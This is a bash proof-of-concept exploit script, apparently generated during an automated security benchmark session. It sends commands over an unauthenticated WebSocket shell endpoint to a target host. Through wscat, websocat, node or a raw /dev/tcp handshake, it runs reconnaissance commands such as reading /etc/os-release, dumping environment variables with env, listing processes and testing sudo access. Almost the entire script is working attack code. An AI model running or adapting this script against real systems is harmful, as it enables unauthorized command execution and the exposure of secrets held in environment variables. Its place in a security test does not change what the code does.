#!/bin/bash
# POC: Demonstrates sensitive system information disclosure via unauthenticated WebSocket shell access by executing reconnaissance commands
# Target: ./repo
# Created: 2025-11-04T17:15:42.049Z
# Session: benchmark-XBEN-023-24-mhktion0

# WebSocket Information Disclosure POC
# Demonstrates retrieval of sensitive system information via unauthenticated WebSocket access

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-8080}"
WS_URL="ws://${TARGET_HOST}:${TARGET_PORT}/ws"

echo "[*] WebSocket Information Disclosure POC"
echo "[*] Target: $WS_URL"
echo ""

# Function to send WebSocket command and capture response
send_websocket_command() {
    local command="$1"
    local description="$2"
    
    echo "[*] Retrieving: $description"
    echo "    Command: $command"
    
    # Use websocat or wscat to send command
    # First, try to use wscat if available
    if command -v wscat &> /dev/null; then
        response=$(echo "$command" | wscat -c "$WS_URL" 2>/dev/null | head -20)
    # Fallback to websocat
    elif command -v websocat &> /dev/null; then
        response=$(echo "$command" | websocat "$WS_URL" 2>/dev/null | head -20)
    # Fallback to node.js WebSocket client
    elif command -v node &> /dev/null; then
        response=$(node -e "
        const WebSocket = require('ws');
        const ws = new WebSocket('$WS_URL');
        ws.on('open', () => {
            ws.send('$command');
            ws.on('message', (data) => {
                console.log(data);
                ws.close();
            });
            setTimeout(() => ws.close(), 1000);
        });
        " 2>/dev/null)
    # Fallback to curl-based approach with socat
    elif command -v socat &> /dev/null && command -v curl &> /dev/null; then
        # This is a simplified HTTP upgrade simulation
        response=$(timeout 2 bash -c "exec 3<>/dev/tcp/${TARGET_HOST}/${TARGET_PORT}; echo -e 'GET /ws HTTP/1.1\r\nHost: ${TARGET_HOST}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n' >&3; sleep 0.5; echo '$command' >&3; cat <&3" 2>/dev/null | grep -v "HTTP\|Upgrade\|Connection\|Sec-WebSocket" | tail -20)
    else
        echo "    [!] No WebSocket client found (wscat, websocat, or node.js required)"
        echo "    [!] Install wscat: npm install -g wscat"
        response="[SKIPPED - No WebSocket client available]"
    fi
    
    echo "    Response:"
    echo "$response" | sed 's/^/        /'
    echo ""
}

# Attempt to connect and retrieve information
echo "[*] Attempting to retrieve sensitive system information..."
echo ""

# Test basic connectivity first
if command -v wscat &> /dev/null || command -v websocat &> /dev/null || command -v node &> /dev/null; then
    
    # 1. Retrieve OS Information
    send_websocket_command "cat /etc/os-release" "OS Information (/etc/os-release)"
    
    # 2. Retrieve Hostname
    send_websocket_command "cat /etc/hostname" "System Hostname (/etc/hostname)"
    
    # 3. Retrieve Network Configuration
    send_websocket_command "ip addr" "Network Configuration (ip addr)"
    
    # 4. Retrieve Process Information
    send_websocket_command "ps aux" "Process Information (ps aux)"
    
    # 5. Retrieve Environment Variables
    send_websocket_command "env" "Environment Variables (env)"
    
    # 6. Test Command Execution Capability
    send_websocket_command "whoami" "Current User (whoami)"
    
    # 7. Retrieve uname output
    send_websocket_command "uname -a" "System Information (uname -a)"
    
    # 8. Check for sudo access
    send_websocket_command "sudo whoami" "Sudo Access Test (sudo whoami)"
    
else
    # Fallback: use direct socket connection for basic test
    echo "[*] Using direct socket connection for testing..."
    
    # Create a temporary WebSocket handshake and send command
    exec 3<>/dev/tcp/${TARGET_HOST}/${TARGET_PORT} 2>/dev/null
    
    if [ $? -eq 0 ]; then
        # Send HTTP upgrade request
        echo -e "GET /ws HTTP/1.1\r\nHost: ${TARGET_HOST}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n" >&3
        
        # Wait for response
        sleep 0.5
        
        # Read response
        cat <&3 | head -20
        
        exec 3>&-
        
        echo "[+] WebSocket connection successful - Information disclosure confirmed"
    else
        echo "[-] Could not connect to WebSocket endpoint"
        exit 1
    fi
fi

echo "[+] POC Execution Complete"
echo "[*] Summary: Unauthenticated WebSocket access allows arbitrary command execution"
echo "[*] Impact: Complete system information disclosure for reconnaissance"